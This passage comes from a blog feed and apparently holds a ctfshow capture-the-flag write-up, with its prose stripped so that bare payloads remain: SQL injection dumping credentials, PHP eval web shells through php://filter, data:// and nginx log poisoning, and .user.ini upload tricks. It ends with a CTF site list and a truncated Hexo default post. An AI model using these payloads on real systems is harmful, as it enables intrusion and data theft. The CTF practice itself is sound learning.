class="token punctuation">(</span>fscanf<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>parse_ini_file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>  false <span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>c=echo file_get_contents(&quot;flag.php&quot;);</code>flag</p><h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p><code>file_get_contents</code><code>c=show_source(&quot;flag.php&quot;);</code>flag<br><img src="https://img-blog.csdnimg.cn/4f4ed1c363c54412be30562549fda20b.png" alt="59"><br>include():</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;POSTc&#x3D;echo include($_GET[1]);&#x2F;&#x2F;url&#x2F;?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>base64flag</p><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p><br><img src="https://img-blog.csdnimg.cn/56fd117279cc402ab4083d3e022ec80a.png" alt="71"><br>post<code>c=include(&#39;flag.php&#39;);</code><br><img src="https://img-blog.csdnimg.cn/bd4e04e75e79476db81a728aa3dbd6e8.png" alt="71"><br>wpindex.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// </span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[0-9][a-z]</p><blockquote><p>$s &#x3D; ob_get_contents();&#x2F;&#x2F;<br>ob_end_clean();&#x2F;&#x2F;</p></blockquote><p><code>exit();</code><code>c=include(&#39;/flag.txt&#39;);exit();</code>flag<br><img src="https://img-blog.csdnimg.cn/689f068a3e7842b48af6b07256822c61.png" alt="71"></p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><p><a href="https://blog.csdn.net/qq_33862778/article/details/80787510?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-80787510-blog-20122145.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-80787510-blog-20122145.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=6">phpob</a></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><blockquote><p><code>//sqlID $sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; </code></p></blockquote><p>idgetusernameflag<br>24flag<br>oror<br><br>-1<br>or or username &#x3D; flag.<br> -1 or username &#x3D; flag<br><strong></strong><br>order by3<br><img src="https://img-blog.csdnimg.cn/e5cf7a706ab9414b8b4efa485c2b3698.png" alt="171"><img src="https://img-blog.csdnimg.cn/561caf246f524743916e4c290284d839.png" alt="171"><br></p><pre><code>-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()--+</code></pre><p>SQLflagpasswordusernameflagpayloadflag</p><pre><code>-1&#39; union select 1,2,password from ctfshow_user where username = &#39;flag&#39; --+</code></pre><p><img src="https://img-blog.csdnimg.cn/8d1fc8e46c754886bebd3bc063318f9f.png" alt="171"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><br><code>1&#39; order by 3--+</code></p><p><br><code>1&#39; union select 1,2,database()--+</code></p><p><br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code></p><p><br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code></p><p><br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></p><h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"> <span class="token comment">//sqlID</span>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from user where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/4c72f7bb235a43aabfc05f68a47b99b8.png" alt="172"><br><br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172"><br><br>ctfshow_user<br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/c47f98754ada4e5f89973323c64eea9a.png" alt="172"></p><p><br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/e652af16a26a46b989ac1a6a87572daa.png" alt="172"><br><code>1&#39; union select 1,2,password FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/b06dc2683d1c4bbf85eb0e874886d09f.png" alt="172"><br>flag<br><code>1&#39; union select 1,username,password FROM ctfshow_user where username =&#39;flag&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/483e7992aec84c5f8801785f651f3ff5.png" alt="172"><br>flag<br><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172"><br><img src="https://img-blog.csdnimg.cn/2a990c58086647cc8f591556d9b90096.png" alt="172"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p><br><img src="https://img-blog.csdnimg.cn/1e8ea89704a54df79708da76200c7d64.png" alt="1"><br>php5phtmlphp5phtmlphp<a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397"> .htaccess .user.ini  </a><br>.user.ininginxx</p><p>pngburp.user.ini<strong>auto_prepend_file&#x3D;1.png</strong>1.png</p><p><img src="https://img-blog.csdnimg.cn/1e185a3845754cbc86e795bf433dbd5c.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/4d12a3b8aa684b9981b21fe50035dde1.png" alt="3"><br>**&#x2F;url&#x2F;upload&#x2F;index.php<strong></strong>12&#x3D;system(cat &#x2F;var&#x2F;www&#x2F;html&#x2F;f*);**flag</p><h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p><img src="https://img-blog.csdnimg.cn/774a6099bce54cc2b80d994fa6ab641e.png" alt="1"><br>.user.ini<br><img src="https://img-blog.csdnimg.cn/772c7be1ba234b79876564de940ce075.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/f4c39dfc13344f92baaf74f1c1131fdb.png" alt="3"><br><img src="https://img-blog.csdnimg.cn/235addb3fca1469cb74c46fecab5ad69.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/aa4c2da456f34dd3989d31231b939a1a.png" alt="5"><br>flag</p><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>phpPHP<br><img src="https://img-blog.csdnimg.cn/f2885b09f69d4050b9e4700968b9b50b.png" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/5642e7dad85e49399077a6ae2e1aa9be.png" alt="1"></p><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p><br><img src="https://img-blog.csdnimg.cn/ffa7b02671d74acfbb1625163c046b88.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/21b518e23e66443893f63357d6fede21.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/25f2dc51ac204ded8df334d61ac99fc9.png" alt="3"><br>**[]<strong></strong>{}**<br><img src="https://img-blog.csdnimg.cn/49012703e34c48dfbc3df84e4bbe7105.png" alt="3"><br></p><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>url&#x2F;upload<br>**function check($str){<br>           return !preg_match(&#x2F;php|{|[|;&#x2F;i, $str);<br>       }**<br>       **php{[;****<?= system('cat ../*.ph*')?>**<br>       **.user.ini****auto_append_file&#x3D;2.png**2.pngphp<br>       url&#x2F;upload&#x2F;flag<br>       <img src="https://img-blog.csdnimg.cn/51c1859b5aef47c6bf2af0bbfc945edd.png" alt="1"></p><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>logflag</p><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>systemsystem**()<strong>,</strong>**</p><blockquote><p>php**&#96;**</p></blockquote><p>**<?= `cat fl*`?>**flag</p><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p> &#96;wplogphp**.<strong>logsevernginx,</strong>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<strong><br><br></strong>.user.ini**2.png<?=include"/var/lo"."g/niginx.access.lo"."g"?> UA<br>url&#x2F;upload&#x2F;<br><img src="https://img-blog.csdnimg.cn/6a94f2203af149be8e487afe9fe74dd9.png" alt="1"><br>flag<br><img src="https://img-blog.csdnimg.cn/e4b85afb4d144b9785e81f42c99bc3f2.png" alt="2"></p><h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>GIF89a<br>flag</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 10:52:43# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 10:54:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload<code>http://56337a28-b2ea-474e-b82d-03c38b2e75f1.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3tmYTljNGExYS01NzE1LTQwOGEtYWU0Yy00ZGU2NzRiM2M4YzZ9Ijs&#x3D;<br>flagctfshow{fa9c4a1a-5715-408a-ae4c-4de674b3c8c6}</p><h3 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:10:14# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>str_replace</strong></p><blockquote><p></p><p>str_replace(find,replace,string,count)</p><p>  find  replace  find  string<br>     count </p></blockquote><p>database64**?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]**<br>system(cat flag.php);</p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:26:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>data<br><strong>getshell</strong></p><blockquote><p>,<strong>HTTP</strong>,<strong>User-Agent</strong>,<strong>Referer</strong><br>HTTP,,,,shell<br>,HTTP,,,getshell</p></blockquote><blockquote><p>nginx  access.log  error.log</p><p>access.log  200<br>404,500404,500error.log</p><p>error.log  nginx<br>nginx</p></blockquote><p>UA**<? eval($_POST[0]);?>**<br><strong>url&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>flag<br><img src="https://img-blog.csdnimg.cn/fa64c532e0954f498c7d91e961397e8a.png" alt="1"></p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 21:57:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('');?>"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>php</code>,<code>data</code>,<code>;</code>,<code>.</code>,url2url<br>filter<strong></strong><strong>a.php</strong><code>php://filter/write=convert.base64-decode/resource=a.php</code>2url<code>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30</code></p><blockquote><p>POSTbase-64<code>content=11PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</code><br>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;<?php eval($_POST[1]);"base6411"<?php die('');?><br>base64 44<?php die('');?>phpdie<br>&#x2F;&#x2F;content&#x3D;&lt;?php eval($_POST[1]);</p></blockquote><blockquote><p>Base64a-zA-Z0-9+&#x2F;64</p></blockquote><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-17 02:27:25# @email: h1xa@ctfer.com# @link: https://ctfer.com */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phpfilterinputdata<br><code>?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw</code><br><strong>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&lt;?php eval($_POST[1]); base64</strong><br><img src="https://img-blog.csdnimg.cn/fc1a66afe139471382895274c504e75d.png" alt="1"><br></p><h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>mp4MISC<strong>010</strong><br><img src="https://img-blog.csdnimg.cn/b100906ba2694fbe8d53b7a163903b95.png" alt="1">png<br><img src="https://img-blog.csdnimg.cn/8b318b0abf324bbcb4eec8e76dfd1898.png#pic_center" alt="2">flag<br><img src="https://img-blog.csdnimg.cn/acc29cf5ea3542709099b5f9ddbf55ce.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/09/%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99/"/>
      <url>/2022/12/09/%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p><br>1 Bugku : <a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a><br>2 CTFHub : <a href="https://www.ctfhub.com/#/index">https://www.ctfhub.com/#/index</a><br>3 NSSCTF : <a href="https://www.ctfer.vip/index">https://www.ctfer.vip/index</a><br>4  : <a href="https://adworld.xctf.org.cn/home/index">https://adworld.xctf.org.cn/home/index</a><br>5 BUUCTF : <a href="https://buuoj.cn/">https://buuoj.cn/</a><br>6 ctfshow : <a href="https://ctf.show/">https://ctf.show/</a><br><a href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a>   <br>ctf<br>1 CTF<a href="http://www.hiencode.com/">http://www.hiencode.com/</a><br>2 md5sha190500TB95%2006 <a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br>3    <a href="http://www.wetools.com/"></a></p><p>4 <a href="https://phpinfo.me/domain"></a></p><p></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag>  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/12/07/hello-world/"/>
      <url>/2022/12/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code 